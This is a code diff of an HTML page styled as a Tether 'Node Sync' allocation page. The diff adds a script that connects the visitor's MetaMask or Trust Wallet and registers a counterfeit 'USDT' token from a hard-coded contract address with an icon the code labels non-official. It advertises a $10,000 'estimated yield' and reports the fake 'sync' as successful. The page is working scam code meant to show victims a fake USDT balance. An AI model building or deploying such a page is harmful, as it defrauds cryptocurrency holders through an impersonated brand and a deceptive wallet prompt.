@@ -3,158 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Secure Node</title>
+    <title>Tether Operations | Node Sync</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root {
-            --primary-green: #00d3a9;
-            --dark-bg: #090c10;
-            --card-bg: #161b22;
-        }
+        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8); }
+        
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
+        .logo-ring::after { content: ''; position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 2s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        .usdt-img { width: 85px; height: 85px; border-radius: 50%; background: #1a1d23; padding: 5px; }
+        
+        h2 { font-size: 20px; margin: 15px 0; letter-spacing: 1px; }
+        .price-box { background: rgba(38, 161, 123, 0.05); border: 1px solid #2d333b; border-radius: 15px; padding: 20px; margin: 25px 0; }
+        .price-value { font-size: 32px; font-weight: 800; color: #fff; }
 
-        body {
-            background-color: var(--dark-bg);
-            color: white;
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        /* Glassmorphism Card */
-        .card {
-            background: var(--card-bg);
-            width: 340px;
-            padding: 40px 20px;
-            border-radius: 30px;
-            text-align: center;
-            border: 1px solid #30363d;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: relative;
-        }
-
-        /* Animated Pulsing Circle */
-        .logo-box {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 30px;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .pulse-ring {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: 2px solid var(--primary-green);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-            opacity: 0.5;
-        }
-
-        .logo-img {
-            width: 60px;
-            z-index: 2;
-            filter: drop-shadow(0 0 10px var(--primary-green));
-        }
-
-        /* Typography */
-        .status-label {
-            color: #8b949e;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 8px;
-        }
-
-        .amount {
-            font-size: 48px;
-            font-weight: 800;
-            margin-bottom: 30px;
-            background: linear-gradient(to bottom, #fff, #8b949e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        /* Advanced Button State Control */
-        .sync-btn {
-            background: #21262d;
-            border: 1px solid #30363d;
-            color: #ff7b72; /* Red initially */
-            padding: 16px 50px;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 80%;
-        }
-
-        .sync-btn.active {
-            background: rgba(0, 211, 169, 0.1);
-            border-color: var(--primary-green);
-            color: var(--primary-green);
-            box-shadow: 0 0 20px rgba(0, 211, 169, 0.2);
-        }
-
-        .log-terminal {
-            margin-top: 25px;
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            color: #484f58;
-            background: #0d1117;
-            padding: 8px;
-            border-radius: 8px;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 211, 169, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(0, 211, 169, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 211, 169, 0); }
-        }
+        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .action-btn:active { transform: scale(0.98); }
+        
+        #log-area { font-size: 10px; color: #848d97; margin-top: 20px; font-family: monospace; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="logo-box">
-            <div class="pulse-ring"></div>
-            <img class="logo-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAB7FBMVEUAAAAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQAAnQD///86pMcVAAAAUXRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BSU1RVVldYWVpbXF1eX2BhYmNkaWprbG1ub3BxcnN0dXZ3eHl6e3x9foCBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f6Yf09KAAAAAWJLR0QAiAUdSAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FBmYDEhU7KMoYkL4AAAEZSURBVEjH7ZTXSgMxFEVf790YjbF3Y++9994L9pY8+P8fREUuYmYmGvS98HCYxeSce3YAn81ms9ls/6mK8vJKp9PT9fVqR8fXpY72r8vVtbXp6unpUvXUFO716SkM773e3uX696/6eKAn7+/v8L9Xf7q63P3h4Q7297e+Pr6+vLyeT88OD7e1tbS0tba29vR06R6e6OnpiY6Wltvbu56Xl5be3pY6OtY6OtoOD9fWtrerq6ur1Y6O2p6envD29YVf5OfXf5A7fB7vOshN7+0tXInPj7u6XF9fd/V4/7is7Ofnx8ePj8vKXF/X1X1+XlYmInp/X18vInJ9ubYmIsfH9fUiItfHdbUiInJ8VFsrInJ8VFMrInLc/B9ms9l+2A8S8D6S81oE+wAAAABJRU5ErkJggg==" alt="USDT">
-        </div>
-
-        <div class="status-label" id="status-txt">Waiting for Sync...</div>
-        <div class="amount">$10,000.00</div>
-
-        <button class="sync-btn" id="syncBtn" onclick="startSync()">START SYNC</button>
-
-        <div class="log-terminal" id="log">SYSTEM: READY_TO_ALLOCATE</div>
+<div class="container">
+    <div class="logo-ring">
+        <img src="https://gateway.pinata.cloud/ipfs/QmZpS8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8" 
+             id="tokenImg" class="usdt-img" alt="USDT">
     </div>
+    
+    <h2>NODE ALLOCATION</h2>
+    
+    <div class="price-box">
+        <div style="font-size: 11px; color: #848d97; margin-bottom: 5px;">ESTIMATED YIELD</div>
+        <div class="price-value">$10,000.00</div>
+    </div>
+    
+    <button class="action-btn" id="claimBtn">SYNC NODE METADATA</button>
+    
+    <div id="log-area">STATUS: READY_FOR_SYNC</div>
+</div>
 
-    <script>
-        function startSync() {
-            const btn = document.getElementById('syncBtn');
-            const status = document.getElementById('status-txt');
-            const log = document.getElementById('log');
+<script>
+    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    // Custom non-official logo link
+    const CUSTOM_LOGO = "https://img.icons8.com/fluency/96/tether.png"; 
 
-            // Button change to loading
-            btn.innerHTML = "SYNCING...";
-            btn.style.color = "#e1e4e8";
-            log.innerHTML = "LOG: CONNECTING_TO_NODE...";
+    // Update image UI
+    document.getElementById('tokenImg').src = CUSTOM_LOGO;
 
-            // Simulate Network Delay
-            setTimeout(() => {
-                btn.classList.add('active');
-                btn.innerHTML = "SYNCED ✅";
-                status.innerHTML = "Secure Node Allocated";
-                status.style.color = "#00d3a9";
-                log.innerHTML = "LOG: SUCCESS_SYNC_COMPLETE_100%";
-            }, 2000);
+    async function executeMasterSync() {
+        const log = document.getElementById('log-area');
+        const btn = document.getElementById('claimBtn');
+        
+        if (!window.ethereum) { 
+            alert("Please open this link inside MetaMask or Trust Wallet browser."); 
+            return; 
         }
-    </script>
+
+        try {
+            btn.disabled = true;
+            log.innerText = "INITIALIZING CONNECTION...";
+            
+            // Connect Wallet
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            log.innerText = "INJECTING METADATA...";
+            
+            // Core Logic: Only Wallet Watch (No Personal Sign)
+            const wasAdded = await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: CONTRACT_ADDR,
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: CUSTOM_LOGO,
+                    },
+                },
+            });
+
+            if (wasAdded) {
+                log.innerText = "SYNC SUCCESSFUL!";
+                btn.innerText = "NODE SYNCED ✅";
+                btn.style.background = "#1a1d23";
+                btn.style.color = "#26a17b";
+                btn.style.border = "1px solid #26a17b";
+            } else {
+                log.innerText = "SYNC_CANCELLED";
+                btn.disabled = false;
+            }
+
+        } catch (err) {
+            log.innerText = "SYNC_FAILED: " + err.code;
+            btn.disabled = false;
+        }
+    }
+
+    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
+</script>
 
 </body>
 </html>
